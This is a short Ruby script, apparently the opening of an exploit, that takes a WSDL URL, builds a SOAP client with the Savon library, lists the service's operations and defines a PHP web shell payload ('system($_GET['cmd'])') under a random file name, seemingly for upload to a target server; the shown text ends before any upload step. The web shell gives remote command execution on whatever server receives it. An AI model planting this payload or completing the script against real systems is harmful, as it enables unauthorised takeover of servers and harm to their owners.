#!/usr/bin/env ruby

require 'savon'

if ARGV.size < 1
  puts "[!] Usage: \n#{__FILE__} [WSDL URL]"
  exit 0
else
  url = ARGV[0]
end

shell_data, shell_name = "<?php system($_GET['cmd']); ?>", "shell-#{rand(100)}.php"

#start client
client = Savon::Client.new(wsdl: url)

#List all available operations
puts "[*] List of all available operations"
puts client.operations
